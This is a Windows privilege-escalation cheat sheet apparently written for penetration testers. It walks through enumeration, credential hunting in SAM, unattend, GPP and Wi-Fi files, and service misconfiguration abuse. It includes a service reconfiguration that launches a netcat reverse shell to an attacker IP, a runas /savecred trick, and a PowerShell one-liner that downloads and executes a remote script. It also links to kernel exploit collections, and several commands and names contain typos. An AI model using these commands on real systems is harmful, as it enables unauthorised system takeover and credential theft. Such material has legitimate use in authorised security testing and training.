# Windows Privilege Escalation 
This cheat sheet contains the flow chart methodology that can be used to test Windows privilege escalation.
## System Information Gathering
Use the following steps to gather basic system information once we get a low privilege shell on a Micorsoft Windows system.
### All System Info
To get system information, try the following DOS command,
```
C:> systeminfo
```
### User Info
We can get a list of users with the following command,
```
C:> net user
C:> net user (USERNAME)
C:> whoami /priv
C:> whoami /all
C:> net accounts
C:> net localgroup
C:> Get-LocalGroup | ft Name
```
### Network Information
We can use DOS to gather network information from the comrpomised taregt Microsoft Windows machine with the following DOS commands,
```
C:> ipconfig /all
C:> route print
C:> arp -A
C:> netstat -ano
C:> netsh firewall show state
C:> netsh firewall show config
C:> netsh advfirewall firewall dump
C:> net share
```
Powershell,
```
PS> Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
PS> Get-DnsClientServerAddress -AddressFamily IPv4 | ft
PS> Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
PS> Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
```
### Scheduled Tasks
Micorosft Windows might have scheduled tasks which we can leverge depending on the task, permissions, the files it accesses and their permissions, and how oftne the task runs. Use the followinf DOS command to gather scheduled task information from Microsoft Windows,
```
C:> schtasks /query /fo LIST /v
C:> tasklist /SVC
C:> net start
```
### Drivers
Some drivers might have vulnerabilities. We can list the drivers used on a Microsoft Windows system with the following DOS command,
```
C:> DRIVERQUERY
```
### Missing Patches
To get the patch information for Microsoft Windows systems, we can us `wmic` as shown below.
```
C:> wmic qfe get Caption, Description, HotFixID, InstalledOn
C:> wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.."
```
Then do a search in Exploit-DB with `searchsploit` in Kali Linux.
## Browser Credentials
Browser credentials could lead to escalation if the credentials are reused on other systems and services. 

### PowerUp
The [PowerUp Power Shell script](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc) PowerSploit module can be used to search for injectable DLLs, service permissions, autologin credentials, web configuration credentials and many other areas of the OS and FS that can be used specifically for privilege escalation.

### PowerLess
[Powerless](https://github.com/M4ximuss/Powerless) is a batch script that will do Windows enumeration and save the output to a file. NOTE: *Also (although the script will run without it), it recommened you copy (an older verison of) AccessChk.exe to the same location. It is recommended you use an older version of AccessChk.exe as the latest verison will not work on some older Windows machines.* You can get Accesschk.exe from [here](https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Privilege%20Escalation/windows-binaries/accesschk.exe).

### Windows Exploit Suggester
[The Windows Exploit Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester) is a simple python script that will utilize the output of the `systeminfo` DOS command. Below you will find the basic usage,
```
C:> systeminfo > systeminfo.txt
```
```
$ ./windows-exploit-suggester.py --update
[*] initiating...
[*] successfully requested base url
[*] scraped ms download url
[+] writing to file 2014-06-06-mssb.xlsx
[*] done
```
install python-xlrd, 
```
root@attacker-machine:~# pip install xlrd --upgrade
```
Now, run the Exploit Suggester on the systeminfo.txt file as so,
```
root@attacker-machine:~# ./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo systeminfo.txt 
[*] initiating...
[*] database file detected as xls or xlsx based on extension
[*] reading from the systeminfo input file
[*] querying database file for potential vulnerabilities
[*] comparing the 15 hotfix(es) against the 173 potential bulletins(s)
[*] there are now 168 remaining vulns
[+] windows version identified as 'Windows 7 SP1 32-bit'
[*] 
[M] MS14-012: Cumulative Security Update for Internet Explorer (2925418) - Critical
[E] MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (2880430) - Important
[M] MS13-090: Cumulative Security Update of ActiveX Kill Bits (2900986) - Critical
[M] MS13-080: Cumulative Security Update for Internet Explorer (2879017) - Critical
[M] MS13-069: Cumulative Security Update for Internet Explorer (2870699) - Critical
[M] MS13-059: Cumulative Security Update for Internet Explorer (2862772) - Critical
[M] MS13-055: Cumulative Security Update for Internet Explorer (2846071) - Critical
[M] MS13-053: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Remote Code Execution (2850851) - Critical
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
[*] done
```

### AlwaysInstallElevated
This option in the Windows registry will aloow us to execute a binary that does `execv()` and adds an admin user no matter what privilege we current are. This will only work if both registry keys contain "AlwaysInstallElevated" with DWORD values of 1.
```
C:\Windows\system32> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
C:\Windows\system32> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
```
### RunAs
You can try the `runas` command with the `/savecred` in hopes that an admin credential has been saved for scripting purposes. For instance, spawn a new shell and write the contents of a protected file to one that you can read, like so,
```
C:\> runas /savecred /user:Administrator "cmd.exe /c type C:\Users\Administrator\Desktop\flag.txt > C:\Users\PwnedUser\Desktop\flag.txt"
```
If the credentials are in fact stored, you will get a new file in the pwned user's desktop called "flag.txt"

### WMIC
Windows Management Instrumentation Console can sometimes be leveraged for privilege escalation.

### Mass Install of Windows to Labs
Sometimes the mass-install process of many Microsoft Windows machines in the same environment can leave behind log files with sensitive information in them. We can check a few of these files if they exist on the file system onthe compromised target Windows machine,
```
c:\sysprep.inf
c:\sysprep\sysprep.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml
```
### Groups.xml
If we have access to the SYSVOL/groups.xml file, we have access to any passwords encrypted in there. When a new GPP is created, there’s an associated XML file created in SYSVOL with the relevant configuration data and if there is a password provided, it is AES-256 bit encrypted. 

Since authenticated users (any domain user or users in a trusted domain) have read access to SYSVOL, anyone in the domain can search the SYSVOL share for XML files containing “cpassword” which is the value that contains the AES encrypted password.
```
C:> findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml
```
The AES decryption key, published by Microsoft themselves, is,
```
4e 99 06 e8  fc b6 6c c9  fa f4 93 10  62 0f fe e8	
f4 96 e8 06  cc 05 79 90  20 9b 09 a4  33 b6 6c 1b
```
There is a PowerSploit Power Shell script that we can use to automate the password reveal [located here.](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1)

### Mass Credentials Search
Below are a few searches that we can do in our DOS prompt for searching for credentials that are stored in files.
```
C:> dir /s *pass* == *cred* == *vnc* == *.config*
C:> findstr /si password *.xml *.ini *.txt
C:> reg query HKLM /f password /t REG_SZ /s
C:> reg query HKCU /f password /t REG_SZ /s
```
We can check the following files for credentials
```
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
Unattend XML Files may contain passwords also,
```
C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```
WiFi Passwords
```
C:> netsh wlan show profile
C:> netsh wlan show profile (SSID) key=clear
```
### Windows Services
Next, we can try Microsoft Windows Services with the following command,
```
C:> sc qc Sploiler
```
If we upload a copy of the `accesschk.exe` binary from [Microsoft SysInternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) we can check alot of permissions for services. For instance,
```
C:> accesschk.exe /accepteula -ucqv Spooler
```
will list the Spooler service and it's permissions. To list all services, simply use an asterisk,
```
C:> accesschk.exe /accepteula -ucqv *
```
We can use it to check for write access to a service with the following DOS command,
```
C:> accesschk.exe /accepteula -uwcqv "Authenticated Users" *
```
Now, let's try it in practice. First a few things need to be in order. We must,
1. Have a space to read and write 
2. Upload the Windows binary of Netcat to the target `/usr/share/binaries/windows` in Kali.
```
C:\> sc qc upnphost
C:\> sc config upnphost binpath= "C:\temp\nc.exe -nv (ATTACKER IP ADDRESS) (ATTACKER PORT) -e C:\WINDOWS\System32\cmd.exe"
C:\> sc config upnphost obj= ".\LocalSystem" password= ""
C:\> sc qc upnphost
C:\> net start upnphost # start the service
```
The access rights that we are looking for in the service to fully exploit it are,
* SERVICE_SHNAGE_CONFIG
* WRITE_DAC
* WRITE_OWNER
* GENERIC_WRITE
* GENERIC_ALL
The important thing to remember is that we find out what user groups our compromised session belongs to. As mentioned previously "Power Users" is also considered to be a low privileged user group. "Power Users" have their own set of vulnerabilities, Mark Russinovich has written a very interesting article on the subject.

Do any services have unquoted paths with spaces?
```
C:> wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:windows\" |findstr /i /v """
C:> gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
### Windows Processes
We can gather information on the currently-running processes with the following commands,
```
C:> tasklist /v
C:> tasklist /v /fi "username eq system"
C:> net start
C:> sc query
PS> Get-Service
PS> Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize
PS> REG QUERY "HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" /v PowerShellVersion
```
Search for weak services using [PowerUp Power Shell](https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps) script,
```
powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
```
### Weak File Permissions
We can also use `accesschk.exe` to determine which files in the target system have weak permissions. You can get Accesschk.exe from [this repository](https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Privilege%20Escalation/windows-binaries/accesschk.exe)
```
C:> accesschk.exe -uwdqs Users c:\
C:> accesschk.exe -uwdqs "Authenticated Users" c:\
C:> accesschk.exe -uwqs Users c:\*.*
C:> accesschk.exe -uwqs "Authenticated Users" c:\*.*
```
## Kernel Exploits
[Here is a list](https://github.com/SecWiki/windows-kernel-exploits) of fully functional Microsoft Windows Kernal exploits that we can attempt.
# References
In this document, I referenced the following resources,
* [*http://www.fuzzysecurity.com/tutorials/16.html*](http://www.fuzzysecurity.com/tutorials/16.html)
